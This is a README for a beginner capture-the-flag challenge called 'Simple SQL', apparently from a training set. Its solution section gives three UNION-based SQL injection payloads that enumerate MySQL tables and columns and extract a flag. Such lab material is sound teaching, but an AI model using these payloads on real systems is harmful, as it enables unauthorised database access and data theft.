# Simple SQL

## Description

I made a simple webserver connected to a MySQL database. Can you extract the flag from it?

## Dev Notes
**THIS IS A WALKTHROUGH CHALLENGE**

Start: `make start`
Stop: `make stop`

## Solution

Enumerate Tables:<br>
Z' UNION SELECT table_name FROM information_schema.tables#<br>
Enumerate Columns:<br>
Z' UNION SELECT column_name,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='flag'#<br>
Extract Flag:<br>
Z' UNION SELECT flag,NULL,NULL,NULL from flag#<br>

